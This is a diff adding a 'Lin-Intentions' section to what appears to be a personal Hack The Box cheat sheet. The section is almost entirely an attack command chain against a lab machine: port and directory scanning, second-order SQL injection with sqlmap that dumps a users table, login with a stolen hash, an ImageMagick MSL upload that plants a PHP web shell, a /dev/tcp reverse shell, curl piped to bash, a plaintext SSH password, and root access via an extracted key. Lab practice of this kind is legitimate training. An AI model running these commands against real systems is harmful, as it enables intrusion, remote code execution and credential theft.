@@ -40,6 +40,46 @@ screen 4.5.0 privesc
 ```
 
 
+# Lin-Intentions
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.11.220
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://intentions.htb/FUZZ -fs 162 -e .aspx,.php,.txt,.html,.sh
+registration
+sqlmap -r req1.txt --batch
+sqlmap -r req2b.txt --batch
+sqlmap -r req1.txt --second-req=req2.txt --batch --tamper=space2comment
+sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch --tamper=space2comment --tables
+sqlmap -r req1b.txt --second-req=req2b.txt --batch --tamper=space2comment -T users --dump
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -t 100 -u http://intentions.htb/api/v2/auth/ -b 403,404
+http://10.10.11.220/api/v2/auth/login
+curl -X POST http://intentions.htb/api/v2/auth/login
+curl -X POST http://intentions.htb/api/v1/auth/login
+curl -d 'email=steve@intentions.htb&hash=$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa' -X POST http://intentions.htb/api/v2/auth/login
+http://10.10.11.220/
+http://intentions.htb/api/v2/auth/login | Edited: v2, hash
+http://intentions.htb/admin#/
+http://intentions.htb/api/v2/admin/image/modify
+python3 -m http.server 80
+http://intentions.htb/api/v2/admin/image/modify
+"path":"http://10.10.14.6/test”
+curl 'http://intentions.htb/api/v2/admin/image/modify' -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Ij[SNAP]OTc2ZjcifQ.Y-yF7_2agtJjTqtFeEThuabmwzTvhDCFoq6tHt0l3zc' -F 'path=vid:msl:/tmp/php*' -F 'effect=asd' -F file=@payload.msl
+http://intentions.htb/storage/rce.php?c=ls
+/bin/bash -i >& /dev/tcp/10.10.14.6/9001 0>&1
+nc -nlvp 9001
+http://intentions.htb/storage/rce.php?c=curl%2010.10.14.6/shell|bash
+ls –la
+git log –p
+git config --global --add safe.directory /var/www/html/intentions
+HOME=/tmp git config --global --add safe.directory /var/www/html/intentions
+HOME=/tmp git log –p
+ssh greg@intentions.htb | Gr3g1sTh3B3stDev3l0per!1998!
+/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
+getcap /opt/scanner/scanner
+python3 extract.py
+ssh –i root_key6 root@10.10.11.220
+```
+
+
 # Lin-Jarvis
 https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
 ```
